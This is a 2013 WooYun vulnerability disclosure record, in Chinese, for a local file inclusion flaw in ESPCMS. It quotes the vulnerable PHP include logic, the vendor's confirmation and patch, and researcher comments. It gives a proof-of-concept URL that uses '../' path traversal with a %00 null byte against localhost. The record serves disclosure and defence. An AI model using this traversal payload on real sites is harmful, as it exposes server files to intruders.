{"id": 13280, "wybug_id": "wooyun-2013-021408", "wybug_title": "ESPCMS Local File Inclusion Vulnerability", "wybug_corp": "易思ESPCMS企业网站管理系统", "wybug_author": "knife", "wybug_date": "2013-04-08 18:39", "wybug_open_date": "2013-04-23 23:21", "wybug_type": "文件包含", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "文件包含漏洞", "文件包含漏洞利用技巧", "源码审核", "源码分析", "文件包含", "本地文件包含利用", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-04-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-04-23：\t厂商提前公开漏洞，细节向公众公开  简要描述： 包含 详细说明：  adminsoft/index.php\n$archive = indexget('archive', 'R');$archive = empty($archive) ? 'adminuser' : $archive;$action = indexget('action', 'R');$action = empty($action) ? 'login' : $action;include admin_ROOT . adminfile . \"/control/$archive.php\";// 包含产生 good nice$control = new important();$action = 'on' . $action;if (method_exists($control, $action)) {$control->$action();} else { exit('错误：系统方法错误！');}\n\n首先看index.php02\t///省略无关代码03\t$archive = indexget('ac', 'R');  //ac04\t$action = indexget('at', 'R');    //at05\t///省略无关代码06\tif (empty($archive) || empty($action)) {07\t        include admin_ROOT . 'interface/public.php';08\t        $mainlist = new mainpage();09\t        if (method_exists($mainlist, 'in_index')) {10\t                $mainlist->in_index();11\t        } else {12\t                exit('Access error!');13\t        }14\t} else {15\t        if (in_array($archive, array('article', 'forum', 'search', 'bbssearch', 'forummain', 'messmain', 'special', 'respond', 'public', 'scriptout', 'enquiry', 'enquirymain', 'form', 'formmain', 'ordermain', 'membermain', 'member', 'forum', 'order'))) { //强制，首页包含木有了16\t                $action = 'in_' . $action; /in_$ 函数17\t                if (!file_exists(admin_ROOT . \"interface/$archive.php\")) { //跟进18\t                        exit('Access error!');19\t                }20\t                include admin_ROOT . \"interface/$archive.php\";21\t                $mainlist = new mainpage();22\t                if (method_exists($mainlist, $action)) {23\t                        $mainlist->$action();24\t                } else {25\t                        exit('Access error!');26\t                }27\t        } else {28\t                exit('Access error!');29\t        }30\t}31\t///省略无关代码32\t跟进到interface/enquity文件33\t///省略无关代码34\t$filename = $this->fun->accept('filename', 'G'); //filename变量35\t                $filename = empty($filename) ? 'list' : $filename;36\t///省略无关代码37\t$output = $this->pagetemplate->fetch($lng . '/lib/' . $filename);  '38\t///省略无关代码39\t///跟进函数库查看40\t        function fetch($tpl_file, $cache_fileID = null, $outHTML = null) {41\t                if (!empty($outHTML)) {42\t                        $out = $this->gettemprequire($outHTML);43\t                        return $out;44\t                }45\t                require_once 'ectemplates_parser.php';46\t 47\t                if ($this->libfile) {48\t                        $tpl_file = $this->templatesDIR . $tpl_file . '.html';  //html49\t                }50\t 51\t                $template_file = $this->tpl_dir . $tpl_file;52\t 53\t                $parsed_file = $this->tpl_c_dir . md5($tpl_file) . '.php';54\t 55\t http://127.0.0.1/espcms_utf8_5.6.13.03.14_b/upload/index.php?ac=scriptout&at=list&tid=1&filename=../../../../index.txt%00\n   漏洞证明：  http://127.0.0.1/espcms_utf8_5.6.13.03.14_b/upload/index.php?ac=scriptout&at=list&tid=1&filename=../../../../index.txt%00   修复方案：  过滤特殊字符   版权声明：转载请注明来源 knife@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-04-08 18:42 厂商回复： 感谢，我们会尽快修复！！！ 最新状态： 2013-04-23：已修正此漏洞！下载地址http://www.ecisp.cn/html/cn/download/  ", "replys": "漏洞评价：\n评论\n     2013-04-08 18:43 |    \t\tknife \t\t\t( 普通白帽子  |\t\t\t        Rank:155 漏洞数:24        | 抬枪上御女，提臀迎众基。)\t\t \n  @易思ESPCMS企业网站管理系统 靠。我爆那么多源码漏洞，这个我才发出来你们就处理了，不得不赞一个    \n     2013-04-08 19:01 |    \t\tblue  \t\t\t( 普通白帽子  |\t\t\t        Rank:779 漏洞数:70        | 我心中有猛虎，细嗅蔷薇。)\t\t \n  @knife =。=    \n     2013-04-08 19:06 |    \t\tknife \t\t\t( 普通白帽子  |\t\t\t        Rank:155 漏洞数:24        | 抬枪上御女，提臀迎众基。)\t\t \n  @blue  (╯‵□′)╯︵┻━┻  一年多没在乌云发什么漏洞了。核心都被撤了    \n     2013-04-09 17:40 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @knife 咋不来了呢还    \n     2013-04-09 22:28 |    \t\tknife \t\t\t( 普通白帽子  |\t\t\t        Rank:155 漏洞数:24        | 抬枪上御女，提臀迎众基。)\t\t \n  @疯狗 太忙了。。    \n     2014-06-20 21:27 |    \t\t小权 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 小菜鸟，求各位大姐大哥多多指教)\t\t \n  @knife给个邀请码    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}